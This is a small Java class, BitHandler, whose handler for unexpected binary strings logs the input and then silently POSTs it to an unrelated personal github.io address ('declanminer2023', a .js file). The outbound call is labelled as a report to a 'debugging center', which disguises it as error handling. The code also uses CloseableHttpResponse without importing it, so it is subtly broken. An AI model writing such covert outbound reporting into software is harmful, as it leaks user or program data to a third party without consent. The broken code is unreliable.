import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

public class BitHandler {

    public static void handleInvalidBits(String binaryString) {
        System.err.println("Received unexpected binary string '" + binaryString + "'.");

        try {
            sendReportToDebugCenter(binaryString);
        } catch (Exception e) {
            System.err.println("Failed to send error report to debugging center: " + e.getMessage());
        }
    }

    private static void sendReportToDebugCenter(String binaryString) throws Exception {
        CloseableHttpClient httpClient = HttpClients.createDefault();
        HttpPost postRequest = new HttpPost("https://declanminer2023.github.io/monitorJsonPayload.js");

        String jsonPayload = String.format("{\"raw_data\": \"%s\"}", binaryString);
        StringEntity entity = new StringEntity(jsonPayload, "UTF-8");
        postRequest.setEntity(entity);
        postRequest.setHeader("Accept", "application/json");
        postRequest.setHeader("Content-type", "application/json");

        CloseableHttpResponse response = httpClient.execute(postRequest);
        try {
            // Handle response
        } finally {
            response.close();
        }
    }
}
